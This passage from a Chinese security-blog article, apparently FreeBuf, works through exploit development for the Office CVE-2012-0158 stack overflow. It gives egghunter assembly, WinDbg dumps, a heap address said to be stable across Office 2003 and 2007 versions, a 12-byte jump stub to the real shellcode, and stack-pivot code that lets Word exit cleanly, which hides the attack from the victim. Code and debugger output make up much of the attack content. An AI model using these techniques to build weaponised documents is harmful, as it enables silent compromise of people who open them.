nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;make&nbsp;sure,zf&nbsp;is&nbsp;not&nbsp;set
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;we&nbsp;found&nbsp;our&nbsp;egg&nbsp;at&nbsp;[edx-4],&nbsp;so&nbsp;we&nbsp;can&nbsp;jmp&nbsp;to&nbsp;edx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;上述代码的主要实现的功能是在内存中不断的与设置的标志位进行比较，若发现相同的字节，则跳转到标志位处执行。标志位紧接这的就是真正的shellcode。编译之后发现整个Eggsearch的大小是33个字节，与我们可控的28个字节还有几个字节的距离，需要对代码进行修改判断，查看是否最终符合不符合需求。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;需要对Eggsearch这段代码进行优化，代码精简使其最终减小到28个字节以内，这是一个非常有难度的事情，因为Eggsearch本身代码已经是经过优化压缩的，在此基础上再次压缩，难度就有些大了。例如push 8，pop eax 这两句汇编指令等于mov eax,8这句指令，但是前者所占用了3个机器码（6a 08 58），后者则占用了5个机器码（b8 08 00 00 00），孰优孰劣一目了然。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;3.3 另辟蹊径编写独特Small ShellCode</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;之前的分析可以发现，优化精简Eggsearch代码是非常繁琐复杂的，很难成功。这时就要考虑是否还有其他更简便的方法来实现我们的目的，如果存在的话，就不用编写搜索内存的Eggsearch代码，漏洞执行效率高，也减少了被安全软件检测到几率。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;现在来分析漏洞执行过程中的代码：</p>
<p><span style="color: rgb(84, 141, 212);"><em><strong>275c87c6 8bc1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp; eax,ecx</strong></em></span></p>
<p><span style="color: rgb(84, 141, 212);"><em><strong>275c87c8 c1e902 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;shr &nbsp; &nbsp; ecx,2</strong></em></span></p>
<p><span style="color: rgb(84, 141, 212);"><em><strong>275c87cb f3a5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rep movs dword ptr es:[edi],dword ptr [esi]</strong></em></span></p>
<p>275c87cd 8bc8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp; ecx,eax</p>
<p>275c87cf 8b4510 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp; eax,dword ptr [ebp+10h]</p>
<p>275c87d2 83e103 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;and &nbsp; &nbsp; ecx,3</p>
<p>275c87d5 6a00 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;push &nbsp; &nbsp;0</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;斜线部分代码即为漏洞触发的关键代码，实际执行的动作其实是Memcpy()函数。要完成完美退出的目的，需要修改的是ecx的大小，即memcpy()函数拷贝字符串的长度，大小为0&#215;34(52)字节，上述是已知的条件，观察下寄存器Esi指向的数据：</p>
<p>0:000&gt; db esi l100</p>
<p>00237790 &nbsp;00 00 00 00 00 00 <em><strong><span style="color: rgb(84, 141, 212);">00 43-43 43 44 44 12 45 fa 7f &nbsp;&#8230;&#8230;.CCCDD.E..</span></strong></em></p>
<p><em><strong><span style="color: rgb(84, 141, 212);">002377a0 &nbsp;00 00 00 00 00 00 00 4a-47 47 47 48 48 48 48 49 &nbsp;&#8230;&#8230;.JGGGHHHHI</span></strong></em></p>
<p><em><strong><span style="color: rgb(84, 141, 212);">002377b0 &nbsp;49 49 4a 4a 4a 4a 4b 4b-4b 4b 4c 4c 4c 4c 4d 4d &nbsp;IIJJJJKKKKLLLLMM</span></strong></em></p>
<p><em><strong><span style="color: rgb(84, 141, 212);">002377c0 &nbsp;4d 4d 4c 4c 4c 4c 4d 4d-4d</span></strong></em> 4f 4f 4f 4f 50 50 50 &nbsp;MMLLLLMMMOOOOPPP</p>
<p>002377d0 &nbsp;50 51 51 51 51 52 52 52-52 53 53 53 53 54 54 54 &nbsp;PQQQQRRRRSSSSTTT</p>
<p>002377e0 5555 55 55 55 56 56 56-56 56 57 57 57 57 57 58 &nbsp;UUUUUVVVVVWWWWW</p>
<p>002377f0 &nbsp;58 58 58 58 59 59 59 5a-5a 5a 5a 5b 5b 5b 5b 5b &nbsp;XXXXYYYZZZZ[[[[[</p>
<p>00237800 &nbsp;5c 5c 5c 5c 5c 5d 5d 5d-98 8a 31 61 61 61 61 6f &nbsp;\\\\\]]]..1aaaao</p>
<p>00237810 &nbsp;70 65 6e 00 e8 11 02 00-00 6a ff e8 08 00 00 00 &nbsp;pen&#8230;&#8230;j&#8230;&#8230;</p>
<p>00237820 &nbsp;05 35 00 00 00 ff 10 c3-e8 00 00 00 00 58 83 c0 &nbsp;.5&#8230;&#8230;&#8230;..X..</p>
<p>00237830 &nbsp;04 2d 77 00 00 00 c3 55-8b ec 52 53 8b 55 08 33 &nbsp;.-w&#8230;.U..RS.U.3</p>
<p>00237840 &nbsp;c0 f7 d0 32 02 b3 08 d1-e8 73 05 35 20 83 b8 ed &nbsp;&#8230;2&#8230;..s.5 &#8230;</p>
<p>00237850 &nbsp;fe cb 75 f3 80 3a 00 74-03 42 eb e7 f7 d0 5b 5a &nbsp;..u..:.t.B&#8230;.[Z</p>
<p>00237860 &nbsp;c9 c2 04 00 51 56 57 33-c9 64 8b 35 30 00 00 00 &nbsp;....QVW3.d.50...</p>
<p>00237870 &nbsp;8b 76 0c 8b 76 1c 8b 46-08 8b 7e 20 8b 36 38 4f &nbsp;.v..v..F..~ .68O</p>
<p>00237880 &nbsp;18 75 f3 5f 5e 59 c3 55-8b ec 57 56 53 51 8b 7d &nbsp;.u._^Y.U..WVSQ.}</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;斜线部分为完美退出可控数据，但是其后的数据也是在文档中，即也是可控数据。重点来了，如果可以通过一些代码的操作，使word程序的执行流程按照我们的想法改变，跳转到寄存器esi指向的数据下面处进行执行，就不用编写Eggsearch代码。</p>
<p>接着看能否实现，记录一下寄存器esi的值，esi=0x00237790，当程序执行到：</p>
<p>0:000&gt; p</p>
<p>eax=00000057 ebx=08440810 ecx=08440810 edx=00630001 esi=00190b6c edi=00000000</p>
<p>eip=275c8a56 esp=00120e78 ebp=44444343 iopl=0 &nbsp; &nbsp; &nbsp; &nbsp; nv up ei pl zr na pe nc</p>
<p>cs=001b &nbsp;ss=0023 &nbsp;ds=0023 &nbsp;es=0023 &nbsp;fs=003b &nbsp;gs=0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; efl=00000246</p>
<p><span style="color: rgb(84, 141, 212);"><strong>MSCOMCTL!DllGetClassObject+0x41d12:</strong></span></p>
<p>275c8a56 c20800 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ret &nbsp; &nbsp; 8</p>
<p>0:000&gt; dds esp</p>
<p>00120e78 &nbsp;7ffa4512</p>
<p>00120e7c &nbsp;00000000</p>
<p>00120e80 &nbsp;4a000000</p>
<p>00120e84 &nbsp;48474747</p>
<p>00120e88 &nbsp;49484848</p>
<p>00120e8c &nbsp;4a4a4949</p>
<p>00120e90 &nbsp;4b4b4a4a</p>
<p>00120e94 &nbsp;4c4c4b4b</p>
<p>00120e98 &nbsp;4d4d4c4c</p>
<p>00120e9c &nbsp;4c4c4d4d</p>
<p>00120ea0 &nbsp;275e7361 MSCOMCTL!DLLGetDocumentation+0x104f</p>
<p>程序此时马上就要跳转到7ffa4512 JMP ESP 指令去执行。搜索之前保存的esi的值。</p>
<p>0:000&gt; sa l?fffffff 90 77 23 00</p>
<p>0011fd30 &nbsp;90 77 23 00 98 2f 21 00-10 00 00 00 e8 93 23 00 &nbsp;.w#../!.......#.</p>
<p><span style="color: rgb(54, 96, 146);"><strong>0014017c &nbsp;90 77 23 00</strong></span> 80 01 14 00-80 01 14 00 b0 1f 21 00 &nbsp;.w#...........!.</p>
<p>002162d0 &nbsp;90 77 23 00 38 02 34 08-b4 e1 fd 7f b4 e1 fd 7f &nbsp;.w#.8.4.........</p>
<p>002168f0 &nbsp;90 77 23 00 38 02 34 08-00 00 00 00 00 00 00 00 &nbsp;.w#.8.4.........</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;反复这个过程进行测试后发现<span style="color: rgb(54, 96, 146);"><strong>0x0014017c</strong></span>，这个地址是固定不变的，并且指向的值必是之前保存的esi，寄存器esi指向了可控的数据，这部分可控数据只是在堆(heap)中并没有拷贝到栈上而已，只需要做到使程序在堆中执行即可。另外<span style="color: rgb(54, 96, 146);"><strong>0x0014017c</strong></span>这个地址在Microsoft Office 2003的其他版本SP0/SP1/SP3，Microsoft Office 2007 SP0/SP1/SP2/SP3中都是稳定不变的，这为完美退出的工作提供了巨大的便利。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;剩下的工作就是根据之前的分析编写相应的汇编代码，工作量的问题了，这里贴出自己编写的代码：</p>
<pre class="prettyprint lang-cpp">#include&nbsp;&lt;WINDOWS.H&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;stdio.h&gt;
void&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__asm{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,0x0014017c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//赋值操作
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,dword&nbsp;ptr&nbsp;[eax]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//取出esi的值，eax指向可控数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;eax,38h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//跳过自身这部分代码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//直接跳往真正的shellcode
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre>
<p>&nbsp;&nbsp;&nbsp;&nbsp;此时通过12个字节就完成了Small ShellCode跳往真正shellcode的工作，与28个可修改字节相差了16个字节，这是一个很有成就感的工作，短小精悍是shellcode的追求。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0x3.4 收尾工作</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;真正ShellCode的功能多种多样，一般文档类的ShellCode无非是生成一个可执行文件并执行之，网上这部分代码也是比较多的，大家可以参考下。先来看下目前的完成了那些工作：</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;完美退出的代码完成。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;跳转代码(Small &nbsp;ShellCode)完成。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;接下来要做什么？</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;想一下就能知道，接下来要做就是对代码进行组合，把各部分的功能添加到一起，使其成为一个有机的整体，真正可用的一个文档类漏洞利用。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;一般情况下，ShellCode完成主体功能之后就退出了，即调用ExitProcess()函数或者类似功能函数来结束进程，但是我们的这个实例要做到完美退出肯定不能这么做。ShellCode主体功能完成之后需要把执行流程交回到Word进程，之后也不能触发任何异常，才是最终的效果。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;具体来说，遵循的原则就是尽可能的不破坏原始栈，shellCode的所有操作均在堆中完成，解决思路是在保存原始栈(ESP)之后对栈顶(ESP)进行交换，使当前栈位于堆上，参数等得传递不在原始栈中进行，汇编指令是 xchg eax,esp。执行ShellCode主体功能之前需要保存原始栈（ESP），因为它关系到最终能不能完美退出。ShellCode主体功能完成之后，使用之前保存的原始栈，进行一系列操作之后，把执行流程交回到Word进程。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;相应的伪代码如下：</p>
<pre class="prettyprint lang-cpp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__asm
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;esi,esp
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;dword&nbsp;ptr&nbsp;[eax&nbsp;+&nbsp;offset],esi
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nop
Xchg&nbsp;eax,esp
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;shellcode主体部分
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//以下为完美退出代码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;esp,dword&nbsp;ptr&nbsp;[eax&nbsp;+&nbsp;offset]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;esp&nbsp;,1ch
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;ebp,dword&nbsp;ptr&nbsp;[esp&nbsp;+1ch]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;8
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0x4&nbsp;总结</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;至此，我们完成了针对CVE-2012-0158 漏洞的完美退出研究分析，确认此漏洞是可以做到完美退出，并且通用性和适用性都是非常高的，不用考虑操作系统的情况下，能够针对Microsoft Office 2003和Microsoft 2007，相比于过去的漏洞利用来说是一个很大的进步。只要去认真分析总是可以研究出一些非常有意思的东西。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;首先yuange1975的一篇微博勾起了自己很大的好奇心，文档类漏洞能否做到完美退出？如果能做到，又该如何去做？这些都是自己需要解决的问题。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;其次选择一个典型的文档类漏洞进行分析构造，CVE-2012-0158就是一个非常经典的栈溢出漏洞，如何利用栈溢出漏洞覆盖特定的数据同时又尽可能的少破坏原始的堆栈结构，构造出一个不执行shellcode的情形下的完美退出例子。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;第三可控可修改代码有限的情况下思考如何执行到真正ShellCode，Eggsearch代码优化精简非常有难度，几乎无解，此时考虑从旁路入手，找到一个通用地址，编写只针对此漏洞的特殊汇编代码并执行到真正的ShellCode之中。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;最后执行ShellCode主体功能之前保存原始栈并尽可能少去破坏原始堆栈结构情况下完成ShellCode的执行，之后恢复堆栈，交回程序执行流程。</p>
<p><span style="color: rgb(38, 38, 38);"><strong>附注：</strong></span></p>
<p>(1)<a href="http://wenku.baidu.com/view/668556f90242a8956bece4ac.html" target="_blank" title="" data_ue_src="http://wenku.baidu.com/view/668556f90242a8956bece4ac.html">Win32环境下函数调用的堆栈之研究</a></p>
<p>(2)<a href="http://wenku.baidu.com/view/e7d3680e7cd184254b3535c1.html" target="_blank" title="" data_ue_src="http://wenku.baidu.com/view/e7d3680e7cd184254b3535c1.html">Win32环境下的堆栈</a></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/夜未央" title="由 夜未央 发布" rel="author">
                                            <img src="http://image.3001.net/2013/10/6.jpg" width="50" height="50" alt="夜未央" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/夜未央">夜未央</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    6                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">4</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/夜未央" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=夜未央" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="解读天书 &#8211; 漏洞利用中级技巧的分析" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
